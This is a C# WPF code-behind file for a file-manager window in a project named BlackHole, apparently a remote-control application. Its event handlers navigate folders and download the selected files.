using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace BlackHole.Master
{
    /// <summary>
    /// Logique d'interaction pour FileManager.xaml
    /// </summary>
    public partial class FileManager : Window
    {
        /// <summary>
        /// 
        /// </summary>
        public FileManager()
        {
            InitializeComponent();

            Loaded += OnNavigate;            
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnNavigate(object sender, RoutedEventArgs e)
        {
            NavigateToFolder(TxtBoxDirectory.Text);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnFolderDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var file = ((ListViewItem)sender).Content as FileMeta;
            if (file.Type == FileType.FOLDER)
                NavigateToFolder(file.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDownloadFile(object sender, RoutedEventArgs e)
        {
            if (FilesList.SelectedItems.Count == 0)
                return;

            foreach(var file in FilesList.SelectedItems.OfType<FileMeta>())            
                if (file.Type == FileType.FILE)
                    DownloadFile(file.Name);
        }
    }
}
